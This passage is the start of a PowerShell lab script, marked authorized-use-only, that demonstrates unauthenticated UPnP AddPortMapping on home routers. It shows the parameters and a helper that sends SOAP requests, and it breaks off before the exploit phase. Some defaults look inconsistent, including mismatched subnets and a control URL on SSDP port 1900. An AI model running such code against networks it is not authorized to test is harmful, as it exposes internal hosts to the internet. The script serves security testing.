<#
.SYNOPSIS
    UPnP IGD exposure lab: discovery, unauthenticated port-mapping PoC,
    external verification, and teardown.

.DESCRIPTION
    Demonstrates that an enabled UPnP IGD accepts unauthenticated SOAP
    requests from any LAN device, including AddPortMapping, which opens an
    internet-facing port to an internal host with no credentials.

    AUTHORIZED USE ONLY. Run only against a network and devices you own or
    are explicitly permitted to test. The PoC opens a port to the internet
    with a short lease and always tears it down. You are responsible for use.

.NOTES
    Run from an elevated (Administrator) PowerShell window.
    Requires nmap on PATH for the discovery phase (optional).

.EXAMPLE
    .\upnp-lab.ps1 -Phase Discover
    .\upnp-lab.ps1 -Phase Enumerate
    .\upnp-lab.ps1 -Phase Exploit
    .\upnp-lab.ps1 -Phase Listen
    .\upnp-lab.ps1 -Phase Teardown
#>

[CmdletBinding()]
param(
    [ValidateSet('Discover','Enumerate','Exploit','Listen','Teardown')]
    [string]$Phase = 'Enumerate',

    # Router LAN IP (gateway). Find with: ipconfig  (Default Gateway)
    [string]$Gateway = '192.168.68.1',

    # IGD control path from rootDesc.xml (WANIPConnection controlURL).
    # This is device-specific. Get it from the Discover phase output.
    [string]$ControlPath = '/ctl/IPConn',

    # Your test host's LAN IP. Find with: ipconfig  (IPv4 Address)
    [string]$HostIp = '192.168.1.100',

    [int]$ExternalPort = 18080,
    [int]$InternalPort = 8080,
    [int]$LeaseSeconds = 3600
)

$svc = 'urn:schemas-upnp-org:service:WANIPConnection:1'
$ctl = "http://$($Gateway):1900$ControlPath"

function Send-Upnp {
    param([string]$Action, [string]$Inner = '')
    $body = @"
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:$Action xmlns:u="$svc">$Inner</u:$Action></s:Body>
</s:Envelope>
"@
    $resp = Invoke-WebRequest -Uri $ctl -Method Post -Body $body -UseBasicParsing `
        -ContentType 'text/xml; charset="utf-8"' `
        -Headers @{ SOAPAction = "`"$svc#$Action`"" }
    [xml]$resp.Content
}

switch ($Phase) {

    'Discover' {
        Write-Host "[*] SSDP / IGD discovery